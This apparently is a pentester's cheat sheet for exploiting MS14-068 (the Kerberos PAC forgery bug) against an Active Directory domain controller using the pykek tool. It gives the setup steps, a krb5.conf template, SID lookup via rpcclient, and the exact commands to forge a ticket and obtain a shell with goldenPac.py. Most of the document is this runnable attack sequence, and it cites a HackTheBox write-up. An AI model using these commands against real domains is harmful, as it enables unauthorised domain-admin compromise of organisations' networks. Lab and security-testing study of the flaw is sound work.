# Pykek Exploit

## Requirements

```
apt-get install krb5-user cifs-utils rdate
```

## Setup

* add DC to hosts
* add DC to resolv.conf

## configure krb5.conf

```

[libdefaults]
	default_realm = DOMAIN.LOCAL

# The following krb5.conf variables are only for MIT Kerberos.
	kdc_timesync = 1
	ccache_type = 4
	forwardable = true
	proxiable = true

[realms]
       DOMAIN.LOCAL = {
	kdc = server.domain.local:88
	admin_server = server.domain.local
	default_domain = DOMAIN.LOCAL 
	}
[domain_realm]
	.domain.internal = DOMAIN.LOCAL
	domain.internal = DOMAIN.LOCAL
```

## Initialize

```
rdate -n <server>
kinit <user>
klist
```

## Get SID

```
rpcclient -U <user>  <server> > lookupnames <user>
```

## Pykek

```
git clone https://github.com/mubix/pykek.git

python ms14-068.py -u <user>@DOMAIN.LOCAL -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d <server>

cp TGT_<user>@DOMAIN.LOCAL.ccache /tmp/krb5cc_0

goldenPac.py DOMAIN.LOCAL/<user>@<server>
```

## References

* https://fzuckerman.wordpress.com/2016/10/09/knock-and-pass-kerberos-exploitation/
* https://www.absolomb.com/2018-02-24-HackTheBox-Mantis-Writeup/
* https://github.com/mubix/pykek
